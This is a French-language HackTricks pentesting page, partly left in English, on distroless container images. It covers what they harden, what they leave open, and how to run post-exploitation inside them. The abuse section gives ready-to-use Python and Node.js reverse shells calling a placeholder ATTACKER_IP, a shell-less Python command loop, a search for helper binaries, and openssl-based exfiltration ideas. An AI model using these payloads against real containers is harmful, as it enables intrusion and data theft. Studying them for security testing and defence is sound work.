# Conteneurs Distroless

{{#include ../../../banners/hacktricks-training.md}}

## Aperçu

Une image **distroless** est une image qui embarque les **composants d'exécution minimaux nécessaires pour exécuter une application spécifique**, tout en supprimant volontairement les outils de distribution habituels tels que les gestionnaires de paquets, les shells et de larges ensembles d'utilitaires génériques userland. En pratique, les images distroless contiennent souvent uniquement le binaire ou le runtime de l'application, ses bibliothèques partagées, des bundles de certificats et une arborescence de système de fichiers très réduite.

L'idée n'est pas que distroless soit une nouvelle primitive d'isolation du kernel. Distroless est une **stratégie de conception d'image**. Elle change ce qui est disponible **à l'intérieur** du système de fichiers du conteneur, pas la façon dont le kernel isole le conteneur. Cette distinction est importante, car distroless durcit l'environnement principalement en réduisant ce qu'un attaquant peut utiliser après avoir obtenu l'exécution de code. Elle ne remplace pas namespaces, seccomp, capabilities, AppArmor, SELinux, ni aucun autre mécanisme d'isolation à l'exécution.

## Pourquoi Distroless existe

Les images distroless sont principalement utilisées pour réduire :

- la taille de l'image
- la complexité opérationnelle de l'image
- le nombre de paquets et de binaires pouvant contenir des vulnérabilités
- le nombre d'outils de post-exploitation disponibles pour un attaquant par défaut

C'est pourquoi les images distroless sont populaires dans les déploiements d'applications en production. Un conteneur qui n'a pas de shell, pas de gestionnaire de paquets, et presque aucun outil générique est généralement plus simple à raisonner opérationnellement et plus difficile à abuser de manière interactive après une compromission.

Exemples de familles d'images de style distroless bien connues incluent :

- les images distroless de Google
- Chainguard hardened/minimal images

## Ce que Distroless ne signifie pas

Une image distroless n'est **pas** :

- automatiquement rootless
- automatiquement non-privileged
- automatiquement read-only
- automatiquement protégée par seccomp, AppArmor, ou SELinux
- automatiquement sûre contre une container escape

Il est toujours possible d'exécuter une image distroless avec `--privileged`, partage de namespace hôte, bind mounts dangereux, ou un socket runtime monté. Dans ce scénario, l'image peut être minimale, mais le conteneur peut rester catastrophiquement peu sûr. Distroless change la surface d'attaque userland, pas la frontière de confiance du kernel.

## Caractéristiques opérationnelles typiques

Lorsque vous compromettez un conteneur distroless, la première chose que vous remarquez généralement est que des hypothèses courantes cessent d'être vraies. Il peut n'y avoir pas de `sh`, pas de `bash`, pas de `ls`, pas de `id`, pas de `cat`, et parfois pas même un environnement basé sur libc qui se comporte comme votre tradecraft habituel l'attend. Cela affecte à la fois l'offense et la défense, car le manque d'outillage rend le debugging, l'incident response et le post-exploitation différents.

Les motifs les plus courants sont :

- le runtime de l'application est présent, mais presque rien d'autre
- les payloads basés sur un shell échouent parce qu'il n'y a pas de shell
- les one-liners d'énumération courants échouent car les binaires utilitaires sont absents
- des protections du système de fichiers, comme un rootfs en lecture seule ou `noexec` sur des tmpfs inscriptibles, sont souvent présentes aussi

C'est cette combinaison qui pousse généralement les gens à parler de « weaponizing distroless ».

## Distroless et post-exploitation

Le principal défi offensif dans un environnement distroless n'est pas toujours le RCE initial. C'est souvent ce qui suit. Si la charge exploitée donne une exécution de code dans un runtime de langage tel que Python, Node.js, Java ou Go, vous pouvez être capable d'exécuter une logique arbitraire, mais pas via les workflows centrés sur le shell qui sont courants sur d'autres cibles Linux.

Cela signifie que le post-exploitation bascule souvent dans l'une des trois directions suivantes :

1. **Utiliser directement le runtime du langage existant** pour énumérer l'environnement, ouvrir des sockets, lire des fichiers, ou stage des payloads supplémentaires.
2. **Charger vos propres outils en mémoire** si le système de fichiers est en lecture seule ou si des emplacements inscriptibles sont montés avec `noexec`.
3. **Exploiter les binaires existants déjà présents dans l'image** si l'application ou ses dépendances incluent quelque chose d'inattendu et utile.

## Abus

### Énumérer le runtime dont vous disposez déjà

Dans de nombreux conteneurs distroless il n'y a pas de shell, mais il y a toujours un runtime d'application. Si la cible est un service Python, Python est présent. Si la cible est Node.js, Node est présent. Cela donne souvent suffisamment de fonctionnalités pour énumérer des fichiers, lire des variables d'environnement, ouvrir des reverse shells, et préparer une exécution en mémoire sans jamais invoquer `/bin/sh`.

Un exemple simple avec Python :
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Un exemple simple avec Node.js :
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Impact :

- récupération des variables d'environnement, incluant souvent des identifiants ou des points de terminaison de service
- énumération du système de fichiers sans `/bin/ls`
- identification des chemins inscriptibles et des secrets montés

### Reverse Shell Sans `/bin/sh`

Si l'image ne contient pas `sh` ou `bash`, un reverse shell classique basé sur un shell peut échouer immédiatement. Dans ce cas, utilisez plutôt le runtime du langage installé.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
Si `/bin/sh` n'existe pas, remplacez la ligne finale par une exécution de commandes pilotée directement par Python ou par une boucle REPL Python.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
Encore une fois, si `/bin/sh` est absent, utilisez directement les API de système de fichiers, de processus et réseau de Node au lieu de lancer un shell.

### Exemple complet : boucle de commande Python sans shell

Si l'image contient Python mais aucun shell, une simple boucle interactive suffit souvent pour conserver une pleine capacité de post-exploitation :
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
Cela n'exige pas un binaire de shell interactif. L'impact est effectivement le même qu'un shell basique du point de vue de l'attaquant : exécution de commandes, énumération et staging de payloads supplémentaires via le runtime existant.

### Exécution d'outils en mémoire

Distroless images are often combined with:

- `readOnlyRootFilesystem: true`
- writable but `noexec` tmpfs such as `/dev/shm`
- a lack of package management tools

That combination makes classic "download binary to disk and run it" workflows unreliable. In those cases, memory execution techniques become the main answer.

The dedicated page for that is:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

The most relevant techniques there are:

- `memfd_create` + `execve` via scripting runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### Binaries déjà présents dans l'image

Certaines Distroless images contiennent encore des binaries nécessaires au fonctionnement qui deviennent utiles après une compromission. Un exemple observé à plusieurs reprises est `openssl`, car les applications en ont parfois besoin pour des tâches liées au crypto- ou TLS-related tasks.

A quick search pattern is:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
Si `openssl` est présent, il peut être utilisé pour :

- connexions TLS sortantes
- exfiltration de données via un canal de sortie autorisé
- préparer des données de payload via des blobs encodés/chiffrés

L'abus exact dépend de ce qui est effectivement installé, mais l'idée générale est que distroless ne signifie pas « aucun outil du tout » ; cela signifie « beaucoup moins d'outils qu'une image de distribution normale ».

## Vérifications

L'objectif de ces vérifications est de déterminer si l'image est réellement distroless en pratique et quels binaires runtime ou binaires d'assistance sont encore disponibles pour la post-exploitation.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
Ce qui est intéressant ici :

- If no shell exists but a runtime such as Python or Node is present, post-exploitation should pivot to runtime-driven execution.
- If the root filesystem is read-only and `/dev/shm` is writable but `noexec`, memory execution techniques become much more relevant.
- If helper binaries such as `openssl`, `busybox`, or `java` exist, they may offer enough functionality to bootstrap further access.

## Paramètres par défaut du runtime

| Image / platform style | Default state | Typical behavior | Common manual weakening |
| --- | --- | --- | --- |
| Images de style Google distroless | Userland minimal par conception | Pas de shell, pas de package manager, uniquement les dépendances d'application/runtime | ajout de debugging layers, sidecar shells, copie de busybox ou d'outils |
| Chainguard minimal images | Userland minimal par conception | Surface de packages réduite, souvent centrée sur un runtime ou un service | utilisation de `:latest-dev` ou variantes debug, copie d'outils pendant la build |
| Kubernetes workloads using distroless images | Dépend de la configuration du Pod | Distroless n'affecte que le userland ; la posture de sécurité du Pod dépend toujours du Pod spec et des runtime defaults | ajout de containers de debug éphémères, host mounts, paramètres de Pod privilégiés |
| Docker / Podman running distroless images | Dépend des run flags | Système de fichiers minimal, mais la sécurité d'exécution dépend toujours des flags et de la configuration du daemon | `--privileged`, host namespace sharing, runtime socket mounts, writable host binds |

Le point clé est que distroless est une **image property**, pas une runtime protection. Sa valeur vient de la réduction de ce qui est disponible à l'intérieur du système de fichiers après compromission.

## Pages associées

Pour les filesystem et memory-execution bypasses couramment nécessaires dans les environnements distroless :

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Pour les container runtime, socket, et mount abuse qui s'appliquent encore aux distroless workloads :

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
